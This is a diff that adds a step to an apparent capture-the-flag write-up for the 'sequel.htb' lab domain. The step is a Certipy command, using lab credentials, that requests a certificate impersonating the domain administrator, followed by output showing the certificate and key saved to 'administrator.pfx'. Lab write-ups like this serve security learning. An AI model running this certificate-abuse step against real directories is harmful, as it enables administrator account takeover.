@@ -501,6 +501,20 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 ```
 
 ```python
+certipy-ad req -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip '10.129.7.162' -target 'dc.sequel.htb' -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn 'administrator@sequel.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 14
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@sequel.htb'
+[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+This requested the certificate for administrator
+
+```python
 
 ```
 
